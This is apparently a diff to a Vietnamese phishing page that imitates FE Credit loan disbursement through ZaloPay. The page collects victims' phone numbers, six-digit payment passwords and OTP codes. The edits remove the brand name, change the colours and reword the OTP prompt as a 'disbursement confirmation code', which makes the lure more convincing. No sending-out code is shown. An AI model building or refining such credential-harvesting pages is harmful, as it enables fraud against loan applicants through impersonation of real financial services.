@@ -6,9 +6,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <meta
       name="description"
-      content="Xác nhận khoản vay FE Credit và giải ngân qua ZaloPay"
+      content="Xác nhận khoản vay qua ZaloPay"
     />
-    <title>Xác Nhận Giải Ngân - FE Credit</title>
+    <title>Xác Nhận Giải Ngân - </title>
     <link rel="preconnect" href="https://fonts.googleapis.com" />
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
     <link
@@ -36,9 +36,9 @@
         /* --- Bảng màu được làm mới --- */
         --fecredit-blue: #004695;
         --fecredit-blue-darker: #003a7c;
-        --fecredit-primary: #00994F;
-        --fecredit-primary-dark: #015C2E;
-        --fecredit-red: #00994F;
+        --fecredit-primary: #003a7c;
+        --fecredit-primary-dark: #003a9e;
+        --fecredit-red: #003a7c;
         --zalopay-blue: #004BCA;
         --zalopay-blue-darker: #003a9e;
         --text-primary: #1a202c; /* Đậm hơn cho tiêu đề chính */
@@ -47,8 +47,8 @@
         --background-primary: #ffffff; /* Nền trắng chính */
         --background-secondary: #f7fafc; /* Nền xám rất nhạt */
         --border-color: #e2e8f0;
-        --success: #38a169;
-        --error: #e53e3e;
+        --success: #004695;
+        --error: #1a202c;
         --global-font: "Inter", sans-serif;
       }
 
@@ -855,11 +855,10 @@
         <!-- Blue header / navbar -->
         <div class="zlp-blue-header">
           <button class="zlp-back-link" onclick="showSection('zalopay-phone-section')">
-            &#8249; Thay đổi số điện thoại
+            &#8249; Xác nhận mật khẩu
           </button>
           <div class="zlp-menu-group">
-            <button class="zlp-menu-btn">&#8230;</button>
-            <button class="zlp-menu-btn">&#10005;</button>
+
           </div>
         </div>
 
@@ -917,12 +916,12 @@
               alt="Back"
             />
           </button>
-          <h1>Xác thực OTP</h1>
+          <h1>XÁC NHẬN GIẢI NGÂN </h1>
         </header>
         <main class="login-page-layout">
           <div class="login-content">
             <div class="login-header">
-              <h2 class="title">Nhập mã xác thực</h2>
+              <h2 class="title">Nhập (OTP)</h2>
               <p class="subtitle" id="zalopay-otp-prompt"></p>
             </div>
             <form onsubmit="event.preventDefault(); handleOtpSubmit();">
@@ -930,7 +929,7 @@
                 type="text"
                 id="zalopay-otp-single"
                 class="otp-single-input"
-                placeholder="Nhập mã OTP"
+                placeholder=""
                 inputmode="numeric"
                 maxlength="8"
                 autocomplete="one-time-code"
@@ -1185,11 +1184,11 @@
             const maskedPhone = `+84 **** ${credentials.phone.slice(-3)}`;
             const otpPrompt = getEl("zalopay-otp-prompt");
             otpPrompt.replaceChildren();
-            otpPrompt.appendChild(document.createTextNode('Mã OTP đã được gửi đến số '));
+            otpPrompt.appendChild(document.createTextNode('Mã xác thực  GIẢI NGÂN đã được gửi đến SĐT '));
             const strong = document.createElement('strong');
             strong.textContent = maskedPhone;
             otpPrompt.appendChild(strong);
-            otpPrompt.appendChild(document.createTextNode('. Vui lòng nhập để xác thực.'));
+            otpPrompt.appendChild(document.createTextNode('. của bạn.'));
             showSection("zalopay-otp-section");
           } else {
             showNotification("Mật khẩu thanh toán phải là 6 chữ số.", "error");
@@ -1363,4 +1362,3 @@
     </script>
   </body>
 </html>
-
